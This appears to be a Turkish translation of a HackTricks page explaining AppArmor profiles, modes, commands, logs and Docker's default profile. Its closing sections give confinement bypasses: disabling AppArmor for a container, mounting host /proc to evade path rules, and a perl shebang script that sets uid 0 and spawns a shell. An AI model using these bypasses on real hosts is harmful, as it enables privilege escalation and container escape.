# AppArmor

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin!</summary>

HackTricks'ı desteklemenin diğer yolları:

- **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
- [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
- [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
- **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'de **takip edin**.
- **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), **dark web** destekli bir arama motorudur ve şirketin veya müşterilerinin **hırsız kötü amaçlı yazılımlar** tarafından **kompromize edilip edilmediğini kontrol etmek için ücretsiz** işlevsellikler sunar.

WhiteIntel'in başlıca amacı, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirmeleri ve fidye yazılımı saldırılarıyla mücadele etmektir.

Websitesini ziyaret edebilir ve motorlarını **ücretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

---

## Temel Bilgiler

AppArmor, **programlara program profilleri aracılığıyla sunulan kaynakları kısıtlamayı amaçlayan bir çekirdek geliştirmesidir**, etkin bir şekilde Zorunlu Erişim Kontrolü (MAC) uygulayarak erişim kontrol özelliklerini doğrudan kullanıcılara bağlamak yerine programlara bağlar. Bu sistem, genellikle önyükleme sırasında profilleri çekirdeğe **yükleyerek çalışır** ve bu profiller, bir programın erişebileceği kaynakları belirler, örneğin ağ bağlantıları, ham soket erişimi ve dosya izinleri gibi.

AppArmor profilleri için iki işletim modu vardır:

- **Uygulama Modu**: Bu mod, profilde tanımlanan politikaları aktif olarak uygular, bu politikalara aykırı hareketleri engeller ve syslog veya auditd gibi sistemler aracılığıyla bunları ihlal etmeye yönelik girişimleri kaydeder.
- **Şikayet Modu**: Uygulama modunun aksine, şikayet modu, profilin politikalarına aykırı hareketleri engellemez. Bunun yerine, bu girişimleri kısıtlamaları uygulamadan politika ihlalleri olarak kaydeder.

### AppArmor'ın Bileşenleri

- **Çekirdek Modülü**: Politikaların uygulanmasından sorumludur.
- **Politikalar**: Program davranışı ve kaynak erişimi için kuralları ve kısıtlamaları belirtir.
- **Ayrıştırıcı**: Politikaları çekirdeğe yükleme veya raporlama işlevini yerine getirir.
- **Araçlar**: AppArmor ile etkileşimde bulunmak ve yönetmek için bir arayüz sağlayan kullanıcı modu programlarıdır.

### Profil Yolu

Apparmor profilleri genellikle _**/etc/apparmor.d/**_ klasöründe saklanır. `sudo aa-status` komutuyla kısıtlanan ikili dosyaları listeleyebilirsiniz. Listelenen her ikili dosyanın yolundaki "/" karakterini bir noktaya değiştirirseniz, bahsedilen klasördeki apparmor profilinin adını elde edersiniz.

Örneğin, _/usr/bin/man_ için bir **apparmor** profili _/etc/apparmor.d/usr.bin.man_ konumunda olacaktır.

### Komutlar
```bash
aa-status     #check the current status
aa-enforce    #set profile to enforce mode (from disable or complain)
aa-complain   #set profile to complain mode (from diable or enforcement)
apparmor_parser #to load/reload an altered policy
aa-genprof    #generate a new profile
aa-logprof    #used to change the policy when the binary/program is changed
aa-mergeprof  #used to merge the policies
```
## Profil Oluşturma

- Etkilenen yürütülebilir dosyayı belirtmek için **mutlak yol ve joker karakterleri** (dosya globbing için) kullanılabilir.
- **Dosyalar** üzerinde yürütülecek erişimi belirtmek için aşağıdaki **erişim kontrolleri** kullanılabilir:
  - **r** (okuma)
  - **w** (yazma)
  - **m** (bellek haritası olarak yürütme)
  - **k** (dosya kilitleme)
  - **l** (sert bağlantı oluşturma)
  - **ix** (yeni programın politikayı devralarak başka bir programı yürütmesi)
  - **Px** (ortamı temizledikten sonra başka bir profil altında yürütme)
  - **Cx** (ortamı temizledikten sonra başka bir alt profil altında yürütme)
  - **Ux** (ortamı temizledikten sonra kısıtlamasız yürütme)
- **Değişkenler** profillerde tanımlanabilir ve profilden dışarıdan manipüle edilebilir. Örneğin: @{PROC} ve @{HOME} (profil dosyasına #include \<tunables/global> ekleyin)
- **İzin verme kurallarını geçersiz kılmak için reddetme kuralları desteklenir**.

### aa-genprof

Profil oluşturmaya başlamak için apparmor size yardımcı olabilir. **Apparmor'un bir binary tarafından gerçekleştirilen eylemleri incelemesine ve ardından hangi eylemleri izin vermek veya reddetmek istediğinize karar vermenize izin vermesi mümkündür**.\
Sadece şunu çalıştırmanız yeterlidir:
```bash
sudo aa-genprof /path/to/binary
```
Ardından, farklı bir konsolda genellikle ikili dosyanın gerçekleştireceği tüm eylemleri gerçekleştirin:
```bash
/path/to/binary -a dosomething
```
Ardından, ilk konsolda "**s**" tuşuna basın ve kaydedilen eylemlerde ihmal etmek, izin vermek veya ne yapmak istediğinizi belirtin. İşiniz bittiğinde "**f**" tuşuna basın ve yeni profil _/etc/apparmor.d/path.to.binary_ dizininde oluşturulacaktır.

{% hint style="info" %}
Yön tuşları kullanarak izin vermek/engellemek/ne yapmak istediğinizi seçebilirsiniz.
{% endhint %}

### aa-easyprof

Ayrıca bir uygulamanın apparmor profil şablonunu şu şekilde oluşturabilirsiniz:
```bash
sudo aa-easyprof /path/to/binary
# vim:syntax=apparmor
# AppArmor policy for binary
# ###AUTHOR###
# ###COPYRIGHT###
# ###COMMENT###

#include <tunables/global>

# No template variables specified

"/path/to/binary" {
#include <abstractions/base>

# No abstractions specified

# No policy groups specified

# No read paths specified

# No write paths specified
}
```
{% hint style="info" %}
Varsayılan olarak oluşturulan bir profilde hiçbir şey izin verilmez, bu nedenle her şey reddedilir. Örneğin, örneğin `/etc/passwd r,` gibi satırlar eklemeniz gerekecektir.
{% endhint %}

Yeni profili ardından şu şekilde **zorlayabilirsiniz**:
```bash
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
### Günlüklerden bir profil değiştirme

Aşağıdaki araç, günlükleri okuyacak ve kullanıcıya tespit edilen yasaklanmış bazı eylemleri izin verip vermek istemediğini soracaktır:
```bash
sudo aa-logprof
```
{% hint style="info" %}
Ok tuşları kullanarak neyi izin vermek/engellemek/neyi olursa olsun seçebilirsiniz
{% endhint %}

### Profil Yönetimi
```bash
#Main profile management commands
apparmor_parser -a /etc/apparmor.d/profile.name #Load a new profile in enforce mode
apparmor_parser -C /etc/apparmor.d/profile.name #Load a new profile in complain mode
apparmor_parser -r /etc/apparmor.d/profile.name #Replace existing profile
apparmor_parser -R /etc/apparmor.d/profile.name #Remove profile
```
## Günlükler

**`service_bin`** yürütülebilir dosyasının _/var/log/audit/audit.log_ dosyasındaki **AUDIT** ve **DENIED** günlük örneği:
```bash
type=AVC msg=audit(1610061880.392:286): apparmor="AUDIT" operation="getattr" profile="/bin/rcat" name="/dev/pts/1" pid=954 comm="service_bin" requested_mask="r" fsuid=1000 ouid=1000
type=AVC msg=audit(1610061880.392:287): apparmor="DENIED" operation="open" profile="/bin/rcat" name="/etc/hosts" pid=954 comm="service_bin" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
```
Aşağıdaki bilgilere şu şekilde de ulaşabilirsiniz:
```bash
sudo aa-notify -s 1 -v
Profile: /bin/service_bin
Operation: open
Name: /etc/passwd
Denied: r
Logfile: /var/log/audit/audit.log

Profile: /bin/service_bin
Operation: open
Name: /etc/hosts
Denied: r
Logfile: /var/log/audit/audit.log

AppArmor denials: 2 (since Wed Jan  6 23:51:08 2021)
For more information, please see: https://wiki.ubuntu.com/DebuggingApparmor
```
## Docker'da Apparmor

Docker'ın **docker-profile** profili varsayılan olarak nasıl yüklendiğine dikkat edin:
```bash
sudo aa-status
apparmor module is loaded.
50 profiles are loaded.
13 profiles are in enforce mode.
/sbin/dhclient
/usr/bin/lxc-start
/usr/lib/NetworkManager/nm-dhcp-client.action
/usr/lib/NetworkManager/nm-dhcp-helper
/usr/lib/chromium-browser/chromium-browser//browser_java
/usr/lib/chromium-browser/chromium-browser//browser_openjdk
/usr/lib/chromium-browser/chromium-browser//sanitized_helper
/usr/lib/connman/scripts/dhclient-script
docker-default
```
Varsayılan olarak **Apparmor docker-default profil**'ü [https://github.com/moby/moby/tree/master/profiles/apparmor](https://github.com/moby/moby/tree/master/profiles/apparmor) adresinden oluşturulur.

**docker-default profil Özeti**:

- Tüm **ağ erişimine** sahiptir
- **Yetenek** tanımlanmamıştır (Ancak, bazı yetenekler temel kural dosyalarını içererek gelecektir, yani #include \<abstractions/base> )
- Herhangi bir **/proc** dosyasına **yazma izni yoktur**
- Diğer /**proc** ve /**sys** alt dizinleri/**dosyaları** okuma/yazma/kilitleme/bağlantı/çalıştırma erişimine **izin verilmez**
- **Bağlama** izni yoktur
- **Ptrace** yalnızca **aynı apparmor profiline** sıkıştırılmış bir işlemde çalıştırılabilir

Bir **docker konteyneri çalıştırdıktan** sonra aşağıdaki çıktıyı görmelisiniz:
```bash
1 processes are in enforce mode.
docker-default (825)
```
Dikkat edin ki **apparmor, varsayılan olarak konteynıra verilen yetenek ayrıcalıklarını bile engelleyecektir**. Örneğin, **SYS\_ADMIN yeteneği verilmiş olsa bile /proc içine yazma iznini engelleyebilecektir** çünkü varsayılan olarak docker apparmor profili bu erişimi reddeder:
```bash
docker run -it --cap-add SYS_ADMIN --security-opt seccomp=unconfined ubuntu /bin/bash
echo "" > /proc/stat
sh: 1: cannot create /proc/stat: Permission denied
```
Apparmor kısıtlamalarını atlamak için **apparmor'u devre dışı bırakmanız** gerekmektedir:
```bash
docker run -it --cap-add SYS_ADMIN --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu /bin/bash
```
Varsayılan olarak **AppArmor**, **konteynerin içinden klasör bağlamasını yasaklayacaktır** bile SYS\_ADMIN yeteneği ile.

Docker konteynerine **yetenekler ekleyebilir/çıkarabilirsiniz** (bu hala **AppArmor** ve **Seccomp** gibi koruma yöntemleri tarafından kısıtlanacaktır):

* `--cap-add=SYS_ADMIN` `SYS_ADMIN` yeteneği verir
* `--cap-add=ALL` tüm yetenekleri verir
* `--cap-drop=ALL --cap-add=SYS_PTRACE` tüm yetenekleri kaldırır ve sadece `SYS_PTRACE` yeteneğini verir

{% hint style="info" %}
Genellikle, bir **docker** konteyneri **içinde** bir **açık yeteneğin** bulunduğunu **fark ettiğinizde** ve **açığın bazı kısımlarının çalışmadığını gördüğünüzde**, bunun nedeni docker **apparmor'ın bunu engelliyor olması** olacaktır.
{% endhint %}

### Örnek

(Örnek [**buradan**](https://sreeninet.wordpress.com/2016/03/06/docker-security-part-2docker-engine/) alınmıştır)

AppArmor işlevselliğini göstermek için, aşağıdaki satırı eklediğim yeni bir Docker profilı olan "mydocker"ı oluşturdum:
```
deny /etc/* w,   # deny write for all files directly in /etc (not in a subdir)
```
Profili etkinleştirmek için aşağıdakileri yapmamız gerekiyor:
```
sudo apparmor_parser -r -W mydocker
```
Profilleri listelemek için aşağıdaki komutu kullanabiliriz. Aşağıdaki komut, yeni AppArmor profilimi listeliyor.
```
$ sudo apparmor_status  | grep mydocker
mydocker
```
Aşağıda gösterildiği gibi, "AppArmor" profili "/etc/" dizinine yazma erişimini engellediği için "etc/" dizinini değiştirmeye çalıştığımızda hata alırız.
```
$ docker run --rm -it --security-opt apparmor:mydocker -v ~/haproxy:/localhost busybox chmod 400 /etc/hostname
chmod: /etc/hostname: Permission denied
```
### AppArmor Docker Bypass1

Bir konteynerin çalıştırdığı **apparmor profilini** bulmak için şunu kullanabilirsiniz:
```bash
docker inspect 9d622d73a614 | grep lowpriv
"AppArmorProfile": "lowpriv",
"apparmor=lowpriv"
```
Ardından, kullanılan tam profilini bulmak için aşağıdaki satırı çalıştırabilirsiniz:
```bash
find /etc/apparmor.d/ -name "*lowpriv*" -maxdepth 1 2>/dev/null
```
### AppArmor Docker Bypass2

Eğer **apparmor docker profilini değiştirebilir ve yeniden yükleyebilirseniz** tuhaf bir durumda. Kısıtlamaları kaldırabilir ve onları "atlayabilirsiniz".

**AppArmor, yol tabanlıdır**, bu da demektir ki eğer **bir dizin içindeki dosyaları koruyorsa** bile **`/proc`** gibi, eğer **konteynerin nasıl çalıştırılacağını yapılandırabilirseniz**, ana bilgisayarın proc dizinini **`/host/proc`** içine bağlayabilir ve artık **AppArmor tarafından korunmaz**.

### AppArmor Shebang Atlatma

Bu [**bu hata**](https://bugs.launchpad.net/apparmor/+bug/1911431)da, **belirli kaynaklarla perl'in çalışmasını engelliyorsanız bile**, sadece bir kabuk betiği oluşturursanız ve ilk satırda **`#!/usr/bin/perl`** belirtirseniz ve dosyayı **doğrudan çalıştırırsanız**, istediğinizi çalıştırabilirsiniz. Örn.:
```perl
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /tmp/test.pl
chmod +x /tmp/test.pl
/tmp/test.pl
```
## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) **karanlık ağ** destekli bir arama motorudur ve şirketin veya müşterilerinin **hırsız kötü amaçlı yazılımlar** tarafından **kompromize edilip edilmediğini** kontrol etmek için **ücretsiz** işlevler sunar.

WhiteIntel'in asıl amacı, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirmeleri ve fidye yazılımı saldırılarıyla mücadele etmektir.

Websitesini ziyaret ederek ve motorlarını **ücretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
